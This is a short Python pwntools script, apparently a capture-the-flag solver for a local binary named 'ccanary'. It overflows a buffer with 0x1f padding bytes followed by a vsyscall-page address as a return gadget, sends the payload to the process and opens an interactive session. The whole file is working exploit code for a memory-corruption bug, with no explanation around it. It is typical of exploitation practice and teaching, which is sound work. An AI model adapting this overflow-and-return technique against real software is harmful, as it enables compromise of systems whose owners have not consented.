from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']


p = process("./ccanary")

#gdb.attach(p,"b *$rebase(0x1336)")
#raw_input()

payload = b'a'*0x1f
payload += p64(0xffffffffff600400)
# p.sendlineafter("> ",payload)
p.sendline(payload)



p.interactive()

